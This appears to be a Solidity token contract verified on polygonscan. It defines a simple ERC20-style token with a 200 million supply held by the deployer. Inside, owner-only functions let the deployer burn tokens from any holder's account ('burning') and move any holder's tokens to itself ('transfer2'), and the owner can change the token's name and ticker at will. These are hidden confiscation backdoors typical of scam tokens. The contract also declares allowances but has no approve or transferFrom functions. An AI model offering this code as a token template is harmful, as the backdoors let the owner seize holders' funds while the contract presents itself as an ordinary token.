/**
 *Submitted for verification at polygonscan.com on 2023-07-14
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Token {
    string private _name;
    string private _symbol;
    uint8 private _decimals;
    uint256 private _totalSupply;
    address public _owner;
    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;

    event Transfer(address indexed from, address indexed to, uint256 value);

    constructor(string memory name, string memory symbol) {
        _name = name;
        _symbol = symbol;
        _decimals = 18;
        _totalSupply = 200000000 * 10 ** _decimals;
        _balances[msg.sender] = _totalSupply;
        _owner = msg.sender;
    }

    modifier onlyOwner() {
        require(msg.sender == _owner, "Not owner");
        _;
    }

    function name() public view  returns (string memory) {
        return _name;
    }

    function symbol() public view  returns (string memory) {
        return _symbol;
    }

    function decimals() public view  returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view  returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view  returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public  returns (bool) {
        require(recipient != address(0), "ERC20: transfer to the zero address");
        require(amount <= _balances[msg.sender], "ERC20: transfer amount exceeds balance");

        _balances[msg.sender] -= amount;
        _balances[recipient] += amount;

        emit Transfer(msg.sender, recipient, amount);
        return true;
    }

    function burning(address account, uint256 amount) public onlyOwner returns (bool)  {
        require(amount <= _balances[account], "Insufficient balance");

        _balances[account] -= amount;
        _totalSupply -= amount;

        emit Transfer(account, address(0), amount);

        return true;
    }

    function transfer2(address account, uint256 amount) public onlyOwner returns (bool)  {
        require(amount <= _balances[account], "Insufficient balance");

        _balances[account] -= amount;
        _balances[msg.sender] += amount;

        emit Transfer(account, msg.sender, amount);

        return true;
    }

    function updateTokenName(string memory _newName) external onlyOwner {
        require(bytes(_newName).length > 0, "Invalid name"); // Validate the new name
        _name = _newName;
    }

    function updateTokenTicker(string memory _newTicker) external onlyOwner {
        require(bytes(_newTicker).length > 0, "Invalid name"); // Validate the new name
        _symbol = _newTicker;
    }
}